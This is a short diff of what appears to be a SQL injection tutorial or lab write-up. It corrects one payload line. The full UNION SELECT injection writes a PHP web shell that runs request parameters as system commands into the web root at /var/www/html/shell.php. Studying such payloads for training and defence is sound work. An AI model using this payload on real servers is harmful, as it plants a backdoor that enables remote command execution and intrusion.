@@ -102,7 +102,7 @@ When this is submitted, no errors are returned and the query has been successful
 
 Now you can write a PHP web shell to the webroot folder with the following PHP command, which will execute directly to the back-end:
 
->\<?php system($\_REQUEST\[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
+>cn' UNION SELECT "", '\<?php system($\_REQUEST\[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
 
 This will return no errors meaning that we likely were able to write to the file.
 
